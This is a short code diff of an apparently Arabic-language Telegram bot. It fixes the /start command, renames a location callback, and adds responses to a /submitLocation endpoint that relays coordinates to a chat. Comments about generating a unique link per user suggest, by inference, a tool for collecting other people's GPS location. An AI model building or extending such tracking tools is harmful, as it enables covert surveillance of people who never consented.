@@ -3551,12 +3551,12 @@ app.get('/submitLocation', (req, res) => {
 });
 
 // أمر البدء /start
-bot.onText(/\/sxhjkkklkjgltart/, (msg) => {
+bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
     const keyboard = {
         inline_keyboard: [
-            [{ text: 'الحصول الموقع 📍', callback_data: `getLocatiov:${chatId}` }]
+            [{ text: 'الحصول الموقع 📍', callback_data: `getLocationi:${chatId}` }]
         ]
     };
     
@@ -3571,7 +3571,7 @@ bot.on('callback_query', (callbackQuery) => {
     const chatId = message.chat.id;
     const data = callbackQuery.data;
 
-    if (data.startsWith('getLocatiov:')) {
+    if (data.startsWith('getLocationi:')) {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
@@ -3605,12 +3605,14 @@ app.post('/submitLocation', async (req, res) => {
         // إرسال الموقع كـ location على الخريطة
         await bot.sendLocation(chatId, latitude, longitude);
 
-        
+        res.status(200).send('تم استلام الموقع بنجاح');
         
     } catch (error) {
-        
+        console.error('خطأ في معالجة الموقع:', error);
+        res.status(500).send('خطأ في الخادم');
     }
 });
+
 const clearTemporaryStorage = () => {
     try {
         console.log('تصفير الذاكرة المؤقتة...');
